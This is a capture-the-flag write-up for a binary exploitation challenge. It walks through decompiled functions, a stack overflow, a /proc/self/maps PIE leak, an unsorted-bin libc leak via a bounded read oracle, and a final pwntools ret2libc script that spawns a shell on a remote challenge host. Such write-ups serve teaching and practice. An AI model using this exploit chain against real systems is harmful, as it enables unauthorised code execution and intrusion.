![[Pasted image 20260406094313.png]]

## FILE & CHECKSEC

![[Pasted image 20260406155103.png]]

> [!note]- Explanation
>
> - **PIE enabled** → binary address is randomized  
> - **No canary** → stack overflow is possible
>
> 👉 Key takeaway: overflow is doable, but addresses are not fixed

## GHIDRA -- Main & Loop ()

``` c

undefined8 main(void)

{
   loop();
   return 0;
}


void loop(void)

{
   int iVar1;
   char *pcVar2;
   size_t sVar3;
   char local_28 [32];
   
   while( true ) {
      while( true ) {
          while( true ) {
             while( true ) {
                 while( true ) {
                    printf("> ");
                    pcVar2 = fgets(local_28,0x20,stdin);
                    if (pcVar2 == (char *)0x0) {
                        return;
                    }
                    sVar3 = strcspn(local_28,"\n");
                    local_28[sVar3] = '\0';
                    iVar1 = strcmp(local_28,"help");
                    if (iVar1 != 0) break;
                    help();
                 }
                 iVar1 = strcmp(local_28,"open");
                 if (iVar1 != 0) break;
                 open_file();
             }
             iVar1 = strcmp(local_28,"write");
             if (iVar1 != 0) break;
             write_buf();
          }
          iVar1 = strcmp(local_28,"console");
          if (iVar1 != 0) break;
          console();
      }
      iVar1 = strcmp(local_28,"exit");
      if (iVar1 == 0) break;
      puts("???");
   }
   return;
}


```

> [!note]- Program Flow (main & loop)
>
> - Program runs entirely inside `loop()`
> - Simple command-based interface
>
> Available commands:
> - `help`
> - `open`
> - `write`
> - `console`
>
> 👉 Next: inspect each function

## Ghidra -- open_file()

``` c

void open_file(void)

{
  char *pcVar1;
  size_t sVar2;
  ssize_t sVar3;
  undefined1 local_158 [256];
  char local_58 [72];
  int local_10;
  int local_c;
  
  printf("Path: ");
  pcVar1 = fgets(local_58,0x40,stdin);
  if (pcVar1 != (char *)0x0) {
     sVar2 = strcspn(local_58,"\n");
     local_58[sVar2] = '\0';
     local_c = open(local_58,0);
     if (local_c < 0) {
        perror("open");
        puts("!!!");
     }
     else {
        sVar3 = read(local_c,local_158,0x40);
        local_10 = (int)sVar3;
        write(1,local_158,(long)local_10);
        write(1,&DAT_00102077,1);
        puts("***");
     }
  }
  return;
}
```

> [!note]- Explanation
>
> - Program reads input using `fgets(...)` from stdin
> - That input is used as the argument to `open(path, 0)`
>
> 👉 Meaning:
> - we can open `flag.txt` (current directory)
> - or any other path we provide (e.g. `/proc/self/maps`)
>
> - Then it calls `read(fd, buf, 0x40)`
>
> ⚠️ Limitation:
> - Only reads up to **0x40 (64 bytes)**

## Ghidra -- write_buf()

``` c

void write_buf(void)

{
  int iVar1;
  undefined1 local_d8 [128];
  undefined1 local_58 [71];
  char local_11;
  size_t local_10;
  
  printf("Content: ");
  local_10 = read(0,local_d8,127);
  printf("Save [Y\\N]? ");
  iVar1 = getchar();
  local_11 = (char)iVar1;
  if ((local_11 == 'Y') || (local_11 == 'y')) {
     memcpy(local_58,local_d8,local_10);
     puts("Content saved");
  }
  else {
     if ((local_11 != 'N') && (local_11 != 'n')) {
        puts("???");
        return;
     }
     free(second);
     second = (void *)0x0;
     puts("Content not saved");
  }
  puts("***");
  return;
}
```

> [!note]- Explanation
>
> - Reads user input using `read(0, local_d8, 127)`
> - If user chooses `Y`, it does:
>
>   `memcpy(local_58, local_d8, local_10)`
>
> ⚠️ Vulnerability:
> - `local_d8` can hold up to `0x7f` bytes
> - `local_58` is much smaller (~`0x48`)
> - `memcpy()` uses **user-controlled size (`local_10`)**
>
> 👉 This leads to a **stack buffer overflow**
>
> ---
>
> 👉 Interesting part:
> - If user chooses `N`, it does:
>
>   `free(second)`
>
> 👉 This will be useful later (heap-related behavior)

## Inspecting 'second' ( XREF )

![[Pasted image 20260406160343.png]]

## We got Setup() from inspecting 'second'

``` c

void setup(void)

{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  first = malloc(0x10);
  second = malloc(0x410);
  third = malloc(0x10);
  memset(first,0x11,0x10);
  memset(third,0x13,0x10);
  x = first;
  y = third;
  return;
}
```

> [!note]- Explanation
>
> - Found via XREF → where `second` is initialized
>
> ```c
> first  = malloc(0x10);
> second = malloc(0x410);
> third  = malloc(0x10);
> ```
>
> 👉 This tells us:
> - `first`, `second`, `third` are **heap allocations**
>
> - Also:
> ```c
> x = first;
> y = third;
> ```
>
> 👉 So `[x, y]` defines a **heap range**
>
> ---
>
> 👉 For now:
> - Just note this layout
> - We will use it later

==Now that we understand the heap setup, we return to the main loop to continue inspecting the remaining functionality.==
## GHIDRA -- Console()

``` c
void console(void)

{
  undefined8 *local_10;
  
  printf("[CONSOLE]: ");
  __isoc99_scanf(&DAT_001020c9,&local_10);
  if ((local_10 < x) || (y < local_10)) {
     puts("!!!");
  }
  else {
     printf(">>> 0x%llx\n",*local_10);
     puts("***");
  }
  return;
}
```

> [!note]- Explanation
>
> - Takes user input using `scanf("%llx", &local_10)`
> - Input is treated as a **pointer (address)**
>
> - Checks:
> ```c
> if ((local_10 < x) || (y < local_10)) → invalid
> else → valid
> ```
>
> 👉 If inside range `[x, y]`:
> ```c
> printf("%llx", *local_10);
> ```
>
> 👉 Meaning:
> - We input an address (hex)
> - Program will **dereference it and print the value**
>
> 👉 This gives a **bounded arbitrary read primitive**

Now that we understand how `console()` works, we need to inspect where `x` and `y` are used, since knowing they point to `first` and `third` is not enough yet.


## We got History() from inspecting 'x'

``` c
void history(void)

{
  int iVar1;
  ulong local_20;
  ulong local_18;
  ulong local_10;
  
  local_10 = x;
  local_18 = y;
  if (y < x) {
     local_10 = y;
     local_18 = x;
  }
  local_20 = local_10;
  if (local_18 - local_10 != 0) {
     iVar1 = rand();
     local_20 = local_10 + (ulong)(long)iVar1 % (local_18 - local_10);
  }
  printf("Yoo ref do somethin %p\n",local_20);
  puts("***");
  return;
}
```

> [!note]- Explanation
>
> This `history()` function prints an address within the range `[x, y]`.
>
> - It sets boundaries using:
>   ```c
>   local_10 = x;
>   local_18 = y;
>   ```
>
> - Then generates:
>   ```c
>   local_20 = local_10 + rand() % (local_18 - local_10);
>   ```
>
> - And prints it:
>   ```c
>   printf("... %p\n", local_20);
>   ```
>
> 👉 Meaning:
> - The returned address is **guaranteed inside `[x, y]`**
>
> ---
>
> 👉 Recall:
> - `x = first`
> - `y = third`
>
> 👉 So this range includes:
> - `first`
> - `second`
> - `third`
>
> 👉 This makes `history()` a way to get a **valid heap address**
>
> ---
>
> ⚠️ Important:
>
> From `help()`:
> ```c
> puts("commands:");
> puts(" help");
> puts(" open");
> puts(" write");
> puts(" exit");
> ```
>
> 👉 There is **no `history` command**
>
> 👉 So:
> - `history()` is **not reachable from the loop**
> - We likely need a **stack overflow to call it**

##  Key Idea: libc leak via `free(second)` + `console()`

> [!note]- How we get libc base
>
> The most important part is understanding how we leak libc from `second`.
>
> ---
>
> 👉 From `setup()`:
>
> ```c
> second = malloc(0x410);
> ```
>
> - `second` is a **large chunk**
> - When freed → it goes into the **unsorted bin**
>
> ---
>
> 👉 When we trigger:
>
> ```c
> free(second);
> ```
>
> - The chunk is inserted into the **unsorted bin**
>
> ---
>
> 👉 Unsorted bin mechanism:
>
> - It is a **circular doubly linked list**
> - Managed by `main_arena` (inside libc)
>
> ```
> main_arena <-> chunk <-> main_arena
> ```
>
> ---
>
> 👉 Key idea:
>
> - `main_arena` acts as the **head of the list**
> - When a chunk is freed:
>   - it is linked back to `main_arena`
>
> 👉 In this case:
>
> - Only **one chunk (`second`) is freed**
>
> ```
> main_arena <-> second <-> main_arena
> ```
>
> ---
>
> 👉 Result (via `console()`):
>
> ```c
> undefined8 *local_10;
> ...
> printf(">>> 0x%llx\n", *local_10);
> ```
>
> - Input is treated as a **pointer**
> - Then **dereferenced**
> - Reads **8 bytes (`undefined8`)**
>
> ---
>
> 👉 Meaning:
>
> - `console(addr)` prints the **first 8 bytes at that address**
>
> ---
>
> 👉 Combine with `free(second)`:
>
> - After being freed, the chunk is placed into the **unsorted bin**
> - Its internal data (header) is overwritten
>
> 👉 Specifically:
> - The first 8 bytes become the **fd pointer**
> - Which points to **main_arena (libc)**
>
> ---
>
> 👉 So:
>
> - If we have the address of `second`
> - We can pass it into `console()`
>
> 👉 It will:
> - Dereference it
> - Read first 8 bytes
> - → leak pointer to `main_arena`
>
> ```
> libc_base = leak - offset(main_arena)
> ```
>
> ---
>
> ## 🔍 How we find `second`
>
> Problem:
> - We don’t know heap addresses
>
> ---
>
> 👉 Step 1: Get valid heap address -- from history()
>
> ```c
> local_10 = x;
 > local_18 = y;
 > if (y < x) {
 >    local_10 = y;
 >    local_18 = x;
 > }
 > local_20 = local_10;
 > if (local_18 - local_10 != 0) {
>     iVar1 = rand();
>     local_20 = local_10 + (ulong)(long)iVar1 % (local_18 - local_10);
>  }
>  printf("Yoo ref do somethin %p\n",local_20);
> ```
>
> - local_20 -> Gives address inside `[x, y]`
>
> ---
>
> 👉 Step 2: Explore with `console()`
>
> ```c
> if ((local_10 < x) || (y < local_10)) {
>     puts("!!!");
> } else {
>     printf(">>> 0x%llx\n", *local_10);
> }
> ```
>
> - If address **< x** or **> y** → `!!!`
> - If inside range → valid read
>
> 👉 Meaning:
> - We can use this as a **boundary oracle**
> - To determine the valid heap range `[x, y]`
>
> ---
>
> 👉 Strategy (binary search concept):
>
> - Start from a valid address from `history()`
>
> - First, try going down by a large step:
>
> ```text
> history_addr - 0x500
> ```
>
> - If that gives `!!!`, it means:
>   - we went too far down
>   - the gap is too large
>
> ---
>
> 👉 Then we shrink the step size:
>
> - Instead of `-0x500`, try something smaller like:
>
> ```text
> history_addr - 0x250
> ```
>
> - If still `!!!` → still too low  
> - If valid → this one is inside range
>
> ---
>
> 👉 Keep repeating this idea:
>
> - If too low (`!!!`) → move back up
> - If valid → try going lower again
>
> - Then keep shrinking the step:
>
> ```text
> -0x100 → -0x80 → -0x40 → -0x20 ...
> ```
>
> ---
>
> 👉 So the idea is exactly like binary search:
>
> - start with a large guess
> - see whether it is too low or still valid
> - then cut the gap smaller and smaller
>
> 👉 Until we converge to:
>
> ```text
> x
> ```
>
> which is the lower bound of the valid range
>
> 👉 Step 3: Locate `second`
>
> - Recall From `setup()`:
>
> ```c
> first  = malloc(0x10);
> second = malloc(0x410);
> third  = malloc(0x10);
> x = first;
> ```
>
> 👉 So:
> - `x` points to `first`
>
> ---
>
> 👉 Memory layout:
>
> ```
> [ first (0x10) ]
> [ second header (0x10) ]
> [ second data ]
> ```
>
> ---
>
> 👉 Therefore:
>
> - To reach `second`’s data:
>
> ```
> x + 0x10 (first)
> + 0x10 (second header)
> = x + 0x20
> ```
>
> ---
>
> 👉 Final:
>
> ```
> console(x + 0x20)
> ```
>
> - Dereference start of `second`
> - → get `fd` (main_arena)
> - → compute libc base

## main_arena offset

![[Pasted image 20260406170633.png]]


![[Pasted image 20260406170624.png]]

> [!note]- Explanation
>
> To get the offset of `main_arena`, I first trigger:
>
> ```c
> free(second);
> ```
>
> by entering `N` inside `write_buf()`.
>
> ---
>
> 👉 This part is important:
>
> - Before anything is freed, the **unsorted bin is empty**
> - So `bins` will not show anything useful yet
>
> 👉 That means:
> - we must free `second` first
> - only then the unsorted bin entry becomes visible
>
> ---
>
> 👉 After `second` is freed, use:
>
> ```text
> bins
> ```
>
> - Now pwndbg shows the unsorted bin entry
> - The pointer there is the one stored by the freed chunk
>
> Example:
>
> ```text
> 0x7ffff7fb1cc0
> ```
>
> ---
>
> 👉 That `0x7...` address is inside **libc**
>
> Then use:
>
> ```text
> vmmap
> ```
>
> to check the libc base at that moment.
>
> Example:
>
> ```text
> 0x7ffff7de4000
> ```
>
> ---
>
> 👉 Finally:
>
> ```text
> main_arena_offset = main_arena - libc_base
> ```
>
> Example:
>
> ```text
> 0x7ffff7fb1cc0 - 0x7ffff7de4000
> ```
>
> - This gives the offset we will use later to recover libc base from the leak

## Reaching `history()` + leaking PIE base

> [!note]- Explanation
>
> We already know `history()` is useful, but there is one problem:
>
> - it does **not** appear in `loop()`
> - so we cannot call it directly from the normal command interface
>
> 👉 The way to reach it is by abusing the overflow in `write_buf()`
>
> ---
>
> 👉 But there is another problem:
>
> - the binary has **PIE enabled**
> - so the address of `history()` is **not fixed**
>
> 👉 That means:
> - before jumping to `history()`
> - we must leak the **PIE base** first
>
> ---
>
> 👉 Luckily, `open_file()` helps us here:
>
> - it reads a path from stdin
> - then uses it in:
>
> ```c
> open(path, 0)
> ```
>
> 👉 So we are not limited to normal files like `flag.txt`
>
> - we can also open:
>
> ```text
> /proc/self/maps
> ```
>
> ---
>
> 👉 `/proc/self/maps` is basically the runtime memory map of the process
>
> - similar idea to `vmmap` in pwndbg
> - it shows where the binary, libc, heap, stack, etc. are mapped
>
> ---
>
> 👉 From there:
>
> - we read the mapping of the PIE binary
> - take its base address
> - then add the known offset of `history()`
>
> 👉 So the flow becomes:
>
> - use `open("/proc/self/maps")` → leak PIE base
> - compute address of `history()`
> - use overflow in `write_buf()` → redirect execution to `history()`

## Solver.py

``` python
#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

LIBC_UNSORTED_BIN_FD = 0x1D3CC0
BINARY_RET = 0x1016
LIBC_RET = 0x26E99
LIBC_POP_RDI = 0x277E5


def conn():
    if args.LOCAL:
        r = process([exe.path], stdin=PTY, stdout=PTY)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("103.185.52.198", 4919)

    return r


def open_file(r, path):
    r.sendlineafter(b"> ", b"open")
    r.sendlineafter(b"Path: ", path)
    data = r.recvuntil(b"***\n", drop=True)
    return data


def sync_menu(r):
    r.clean(0.05)


def write_once(r, payload, save, sync=True):
    r.sendlineafter(b"> ", b"write")
    r.sendafter(b"Content: ", payload)
    r.recvuntil(b"Save [Y\\N]? ")
    r.send(save)
    out = r.recvuntil(b"***\n", drop=True)
    return out


def history_ref(r, pie):
    chain = flat(
        b"A" * 0x50,
        b"B" * 8,
        pie + BINARY_RET,
        pie + exe.sym["history"],
        pie + BINARY_RET,
        pie + exe.sym["loop"],
    )
    write_once(r, chain, b"Y", sync=False)
    out = r.recvuntil(b"***\n", drop=True)
    return int(re.search(rb"0x[0-9a-fA-F]+", out).group(0), 16)


def console_read(r, addr):
    r.sendlineafter(b"> ", b"console")
    r.sendlineafter(b"[CONSOLE]: ", hex(addr).encode())
    line = r.recvline().strip()
    if line == b"!!!":
        return None
    r.recvuntil(b"***\n")
    return int(re.search(rb"0x[0-9a-fA-F]+", line).group(0), 16)


def find_heap_start(r, ref):
    lo = ref - 0x500
    while console_read(r, lo) is not None:
        lo -= 0x500

    hi = ref
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if console_read(r, mid) is None:
            lo = mid
        else:
            hi = mid
    return hi


def exploit(r):
    pie = int(open_file(r, b"/proc/self/maps").split(b"-", 1)[0], 16)

    ref = history_ref(r, pie)
    heap = find_heap_start(r, ref)

    write_once(r, b"Z", b"N")
    libc_leak = console_read(r, heap + 0x20)
    libc.address = libc_leak - LIBC_UNSORTED_BIN_FD

    chain = flat(
        b"A" * 0x50,
        b"B" * 8,
        libc.address + LIBC_RET,
        libc.address + LIBC_POP_RDI,
        next(libc.search(b"/bin/sh\x00")),
        libc.sym["system"],
    )
    write_once(r, chain, b"Y")
    r.sendline(b"cat flag.txt")
    try:
        print(r.recvline(timeout=1).decode(errors="ignore").strip())
    except EOFError:
        pass
    r.interactive()


def main():
    r = conn()
    exploit(r)


if __name__ == "__main__":
    main()

```

> [!note]- Important constants
>
> ```python
> LIBC_UNSORTED_BIN_FD = 0x1D3CC0
> BINARY_RET = 0x1016
> LIBC_RET = 0x26E99
> LIBC_POP_RDI = 0x277E5
> ```
>
> - `LIBC_UNSORTED_BIN_FD` is the offset from libc base to the leaked unsorted-bin pointer (`main_arena`)
> - `BINARY_RET` is the `ret` gadget inside the PIE binary
> - `LIBC_RET` is the `ret` gadget inside libc
> - `LIBC_POP_RDI` is the `pop rdi ; ret` gadget inside libc
>
> These were gathered earlier using:
> - `bins` + `vmmap` in GDB for the unsorted-bin / `main_arena` offset
> - `ROPgadget` for `binary_ret, libc_ret` and `pop rdi ; ret`

> [!note]- PIE leak
>
> ```python
> pie = int(open_file(r, b"/proc/self/maps").split(b"-", 1)[0], 16)
> ```
>
> - `open_file()` lets us provide an arbitrary path
> - so we open:
>
> ```text
> /proc/self/maps
> ```
>
> - then parse the first mapping
> - that gives the PIE base of the binary

> [!note]- Calling hidden `history()`
>
> ```python
> def history_ref(r, pie):
>     chain = flat(
>         b"A" * 0x50,
>         b"B" * 8,
>         pie + BINARY_RET,
>         pie + exe.sym["history"],
>         pie + BINARY_RET,
>         pie + exe.sym["loop"],
>     )
>     write_once(r, chain, b"Y", sync=False)
>     out = r.recvuntil(b"***\n", drop=True)
>     return int(re.search(rb"0x[0-9a-fA-F]+", out).group(0), 16)
> ```
>
> - `history()` is not reachable from `loop()`
> - so we use the overflow in `write_buf()` to jump to it
>
> Payload idea:
> - padding to RIP
> - `ret`
> - `history()`
> - `ret`
> - `loop()`
>
> This gives us:
> - one valid heap address from `history()`
> - then safely returns to the menu

> [!note]- Binary search to find `x`
>
> ```python
> def find_heap_start(r, ref):
>     lo = ref - 0x500
>     while console_read(r, lo) is not None:
>         lo -= 0x500
> 
>     hi = ref
>     while hi - lo > 1:
>         mid = (lo + hi) // 2
>         if console_read(r, mid) is None:
>             lo = mid
>         else:
>             hi = mid
>     return hi
> ```
>
> - `history()` gives one valid address inside `[x, y]`
> - `console()` tells us:
>   - valid address → prints value
>   - invalid address → `!!!`
>
> Strategy:
> - go downward first with a large step (`-0x500`)
> - once it becomes invalid, we know we went too low
> - then do binary search between:
>   - one known invalid address
>   - one known valid address
>
> Result:
> - we converge to the exact lower bound
> - that lower bound is `x`

> [!note]- Freeing `second` and leaking libc
>
> ```python
> write_once(r, b"Z", b"N")
> libc_leak = console_read(r, heap + 0x20)
> libc.address = libc_leak - LIBC_UNSORTED_BIN_FD
> ```
>
> - choosing `N` in `write_buf()` triggers:
>
> ```c
> free(second);
> ```
>
> - since `second` was allocated as:
>
> ```c
> second = malloc(0x410);
> ```
>
> it goes into the **unsorted bin**
>
> - unsorted bin is a circular doubly linked list managed by `main_arena`
> - because only `second` is freed, its first pointer becomes a pointer to `main_arena`
>
> Now recall `console()`:
>
> ```c
> undefined8 *local_10;
> printf(">>> 0x%llx\n", *local_10);
> ```
>
> - it dereferences the address we provide
> - and reads 8 bytes
>
> After finding `x`:
> - `x` points to `first`
> - `first` has size `0x10`
> - next `0x10` is the header of `second`
>
> So:
>
> ```text
> x + 0x20
> ```
>
> points to the start of `second`’s data
>
> After `free(second)`:
> - the first 8 bytes there become the unsorted-bin `fd`
> - that points to `main_arena`
>
> So:
>
> ```python
> libc_leak = console_read(r, heap + 0x20)
> libc.address = libc_leak - LIBC_UNSORTED_BIN_FD
> ```
>
> gives us the libc base

> [!note]- Final ret2libc
>
> ```python
> chain = flat(
>     b"A" * 0x50,
>     b"B" * 8,
>     libc.address + LIBC_RET,
>     libc.address + LIBC_POP_RDI,
>     next(libc.search(b"/bin/sh\x00")),
>     libc.sym["system"],
> )
> ```
>
> This final chain does:
>
> ```c
> system("/bin/sh")
> ```
>
> Layout:
> - padding
> - saved RBP overwrite
> - libc `ret` for alignment
> - libc `pop rdi ; ret`
> - pointer to `"/bin/sh"`
> - `system`
>
> After that:
>
> ```python
> r.sendline(b"cat flag.txt")
> ```
>
> to print the flag

> [!note]- Final exploit flow
>
> 1. Open `/proc/self/maps`
> 2. Leak PIE base
> 3. Overflow into `history()`
> 4. Get valid heap reference
> 5. Binary search to find `x`
> 6. Trigger `free(second)`
> 7. Read `main_arena` pointer from `second`
> 8. Compute libc base
> 9. Final ret2libc to `system("/bin/sh")`
> 10. `cat flag.txt`
## FLAG

![[Pasted image 20260406172449.png]]
